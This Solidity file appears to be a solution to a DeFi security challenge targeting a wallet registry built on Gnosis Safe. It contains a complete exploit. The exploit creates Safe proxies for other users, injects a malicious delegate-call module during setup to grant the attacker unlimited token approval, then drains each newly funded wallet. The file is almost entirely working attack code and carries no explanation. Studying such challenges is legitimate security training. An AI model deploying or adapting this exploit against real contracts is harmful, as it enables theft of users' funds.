// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";

/// @title IGnosisFactory - Interface for Gnosis Safe Factory
interface IGnosisFactory {
    /// @notice Creates a new proxy with a callback
    /// @param _singleton Address of the master copy contract
    /// @param initializer Initialization data for the proxy
    /// @param saltNonce Nonce for the CREATE2 call
    /// @param callback Callback contract to be called after the proxy is created
    /// @return proxy The created Gnosis Safe proxy
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

/// @title MaliciousApprove - Malicious contract to approve an attacker
contract MaliciousApprove {
    /// @notice Approves the attacker to spend tokens
    /// @param attacker Address of the attacker
    /// @param token The token to approve
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

/// @title AttackBackdoor - Contract to exploit the WalletRegistry backdoor
contract AttackBackdoor {
    WalletRegistry private walletRegistry;
    IGnosisFactory private factory;
    GnosisSafe private masterCopy;
    IERC20 private token;
    MaliciousApprove private maliciousApprove;

    /// @notice Constructor to initialize the AttackBackdoor contract
    /// @param _walletRegistry Address of the WalletRegistry contract
    /// @param users Array of user addresses to exploit
    constructor(address _walletRegistry, address[] memory users) {
        // Set state variables
        walletRegistry = WalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        factory = IGnosisFactory(walletRegistry.walletFactory());
        token = IERC20(walletRegistry.token());

        // Deploy malicious backdoor for approve
        maliciousApprove = new MaliciousApprove();

        // Create a new safe through the factory for every user
        bytes memory initializer;
        address[] memory owners = new address[](1);
        address wallet;

        for (uint256 i; i < users.length; i++) {
            owners[0] = users[i];
            initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(maliciousApprove),
                abi.encodeWithSignature(
                    "approve(address,address)",
                    address(this),
                    address(token)
                ),
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            wallet = address(
                factory.createProxyWithCallback(
                    address(masterCopy),
                    initializer,
                    0,
                    walletRegistry
                )
            );

            // Transfer tokens from the created wallet to the attacker
            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet));
        }
    }
}
